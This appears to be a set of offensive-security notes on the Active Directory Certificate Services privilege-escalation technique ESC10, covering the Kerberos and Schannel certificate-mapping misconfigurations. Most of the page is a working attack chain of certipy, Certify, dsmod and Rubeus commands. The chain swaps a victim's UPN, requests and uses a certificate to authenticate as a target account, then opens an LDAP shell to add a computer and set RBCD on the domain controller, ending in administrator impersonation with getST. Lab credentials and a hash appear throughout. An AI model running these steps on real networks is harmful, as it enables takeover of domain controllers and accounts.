## Overview
ESC10 its same as ESC9 but instead of being restriced to specific tempate that is vulnerable, the registry key are set to be insecure that makes all templates are vulnerable to ESC9. So all you need is find authentication template to abuse it to do privilege escalatoin. 

We have two cases, The first case involves a misconfiguration in the `StrongCertificateBindingEnforcement` registry key, which handles certificate mapping during Kerberos authentication. The second case is related to a misconfiguration in the `CertificateMappingMethods` registry key, which controls certificate mapping during Schannel authentication. Consequently, Case 1 exploitation requires authentication via Kerberos with the certificate, while Case 2 requires Schannel authentication.

### Case 1 - kerberos mapping misconfiguration
To successfully abuse this misconfiguration, specific prerequisites must be met:
1. The `StrongCertificateBindingEnforcement` registry key is set to `0`, indicating that no strong mapping is performed. It's important to note that this value will only be considered if the April 2023 updates have yet to be installed.
2. At least one template specifies that client authentication is enabled (e.g., the built-in User template).
3. We have at least `GenericWrite` rights for account A, allowing us to compromise account B.

### Case2 - Schannel mapping misconfiguration
To successfully carry out this privilege escalation tactic, specific prerequisites must be met:
1. The `CertificateMappingMethods` registry key is set to `0x4`, indicating no strong mapping.
2. At least one template is enabled for `client authentication` (e.g., the built-in User template).
3. We have at least `GenericWrite` rights for any account A, allowing us to compromise any account B that does not already have a UPN set (e.g., machine accounts or built-in Administrator accounts). This is important to avoid constraint violation errors on the UPN.

---
## Enumeration


> [!Attention] 
> Reading registry requires privileged user, so most of the times you won't be able to read those values. So, you can test for ESC10 blindly and it will be trial and error.

### Case 1 - kerberos mapping misconfiguration
#### linux
```sh
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

    StrongCertificateBindingEnforcement     REG_DWORD        0x0
```
#### Windows
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc"
```

### Case2 - Schannel mapping misconfiguration
#### Linux
```sh
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
```
#### Windows
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
```

---
## Abuse
### Case 1 - kerberos mapping misconfiguration
#### Linux
Same as ESC9
```sh
# Victim: Account we have GenericWrite on it.
# Target: Account that we want to compromise.
certipy account -u "$USER" -p "$PASSWORD" -target $DC -user victim read
certipy shadow auto -u "$USER" -p "$PASSWORD" -target $DC -account victim

# 1. update the victim upn to be as the target UPN.
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn target@lab.local 

# 2. Request certificate as Victim.
certipy req -u 'victim@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9

# 3. revert the changes in the UPN in victim account
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn victim@lab.local

# 4. authenticate as target using the generated certificate.
certipy auth -pfx target.pfx -domain lab.local
```
#### Windows
```powershell
dsmod user "CN=victim,CN=Users,DC=lab,DC=local" -upn "target@lab.local" # change UPN of a user
.\certify.exe request --ca LAB-DC\lab-LAB-DC-CA --template ESC9
dsmod user "CN=victim,CN=Users,DC=lab,DC=local" -upn "victim@lab.local" # revert changes in UPN.

.\Rubeus.exe asktgt /user:target /certificate:$CertText /ptt /nowrap
```

### Case2 - Schannel mapping misconfiguration
Same as ESC9 but the post exploitation process is different because PKINIT isn't enabled, so we are restricted to use ldap, using high privileged account that has ldap shell we can create RBCD or create high privileged account etc...
#### Linux
```sh
# 1. update the victim upn to be as the target UPN.
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn target@lab.local 

# 2. Request certificate as Victim.
certipy req -u 'victim@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9

# 3. revert the changes in the UPN in victim account
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn victim@lab.local

# 4. authenticate as target using the generated certificate.
certipy auth -pfx target.pfx -domain $DOMAIN -dc-ip $IP -ldap-shell

# 5. Create computer and set RBCD on DC.
> add_computer plaintext plaintext123
Attempting to add a new computer with the name: plaintext$
Inferred Domain DN: DC=lab,DC=local
Inferred Domain Name: lab.local
New Computer DN: CN=plaintext,CN=Computers,DC=lab,DC=local
Adding new computer with username: plaintext$ and password: plaintext123 result: OK

# set RBCD
> set_rbcd lab-dc$ plaintext$
Found Target DN: CN=LAB-DC,OU=Domain Controllers,DC=lab,DC=local
Target SID: S-1-5-21-2570265163-3918697770-3667495639-1000

Found Grantee DN: CN=plaintext,CN=Computers,DC=lab,DC=local
Grantee SID: S-1-5-21-2570265163-3918697770-3667495639-2601
Delegation rights modified successfully!
plaintext$ can now impersonate users on lab-dc$ via S4U2Proxy

# 6. Abuse RBCD to get ST as administrator
getST.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP -spn cifs/$DC -impersonate administrator 
```